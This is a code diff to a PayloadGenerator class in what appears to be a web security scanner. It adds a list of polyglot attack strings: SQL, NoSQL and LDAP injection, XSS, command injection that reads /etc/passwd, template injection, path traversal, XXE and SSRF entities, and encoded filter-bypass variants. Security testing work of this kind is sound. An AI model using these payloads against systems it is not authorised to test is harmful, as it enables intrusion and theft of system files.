@@ -984,14 +984,46 @@ class PayloadGenerator:
 
             # ===== POLYGLOT PAYLOADS (multi-context) =====
             "polyglot": [
+                # SQLi + XSS combos
                 "' OR 1=1--<script>alert(1)</script>",
-                "; ls<script>alert(1)</script>",
                 "'\"><script>alert(1)</script>",
-                "'; ls; SELECT * FROM users--",
-                "{{7*7}}<script>alert(1)</script>",
-                "' OR 1=1--{{7*7}}",
-                "<svg onload=alert(1)>'; DROP TABLE--",
+                "' UNION SELECT '<script>alert(1)</script>',NULL--",
+                "1' AND '1'='1<img src=x onerror=alert(1)>",
+                "admin'--<svg/onload=alert(1)>",
+                # Command injection + XSS combos
+                "; ls<script>alert(1)</script>",
                 "$(id)<img src=x onerror=alert(1)>",
+                "|cat /etc/passwd<script>alert(1)</script>",
+                "`whoami`<svg onload=alert(1)>",
+                # SSTI + XSS combos
+                "{{7*7}}<script>alert(1)</script>",
+                "${7*7}<img src=x onerror=alert(1)>",
+                "<%= 7*7 %><script>alert(1)</script>",
+                "#{7*7}<svg/onload=alert(1)>",
+                # Command injection + SQLi combos
+                "'; ls; SELECT * FROM users--",
+                "| cat /etc/passwd; SELECT @@version--",
+                "`id`' OR '1'='1",
+                "$(whoami)' UNION SELECT NULL--",
+                # Path traversal + SSTI combos
+                "../../etc/passwd{{7*7}}",
+                "..\\..\\..\\windows\\win.ini${7*7}",
+                "....//....//etc/passwd<%= 7*7 %>",
+                # XXE + SSRF combos
+                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><x>&xxe;</x>',
+                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
+                # NoSQL + XSS combos
+                '{"$gt":"<script>alert(1)</script>"}',
+                '{"$ne":"<img src=x onerror=alert(1)>"}',
+                # LDAP + SQLi combos
+                "*))(|(uid=*)' OR '1'='1",
+                "admin)(|(password=*)--",
+                # Multi-encoding variants (URL-encoded)
+                "%27%20OR%201%3D1--%3Cscript%3Ealert(1)%3C/script%3E",
+                # Double-encoded
+                "%2527%2520OR%25201%253D1--%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+                # Unicode variants
+                "\\u0027 OR 1=1--<script>alert(1)</script>",
             ],
 
             # ===== DB-SPECIFIC SQLi PAYLOADS =====
@@ -1082,6 +1114,17 @@ class PayloadGenerator:
 
         # Ultimate fallback: top stored XSS payloads
         return list(self.payload_libraries.get("xss_stored", []))[:10]
+
+    def get_polyglot_payloads(self, max_count: int = 10) -> List[str]:
+        """Get multi-context polyglot payloads.
+
+        Returns payloads designed to trigger across multiple vulnerability
+        types simultaneously (SQLi+XSS, SSTI+XSS, CMDi+SQLi, etc.).
+        """
+        all_polyglots = list(self.payload_libraries.get("polyglot", []))
+        if max_count > 0 and len(all_polyglots) > max_count:
+            return all_polyglots[:max_count]
+        return all_polyglots
 
     def get_filter_bypass_payloads(self, filter_map: Dict[str, Any]) -> List[str]:
         """Get bypass payloads based on what's blocked/allowed by filters.
